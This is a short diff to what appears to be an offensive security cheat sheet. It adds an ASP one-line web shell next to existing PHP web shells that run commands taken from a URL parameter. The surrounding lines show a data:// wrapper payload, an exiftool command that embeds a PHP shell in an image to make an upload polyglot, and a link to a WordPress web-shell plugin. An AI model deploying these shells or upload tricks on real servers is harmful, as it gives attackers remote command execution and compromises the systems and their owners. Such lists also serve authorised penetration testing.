@@ -353,6 +353,9 @@ data://text/plain;base64,<base64>&cmd=ls
 <?php echo(shell_exec($_GET["cmd"])); ?>
 <?php echo(exec($_GET["cmd"]));?>
 ```
+```asp
+<% eval request('cmd') %>
+```
 ## File Upload
 htaccess
 ```bash
@@ -362,7 +365,6 @@ polyglot
 ```
 exiftool -Comment='<?php echo "START\n"; echo(exec($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
 ```
-
 Wordpress <br/>
 https://github.com/p0dalirius/Wordpress-webshell-plugin
 ## Reverse Shell
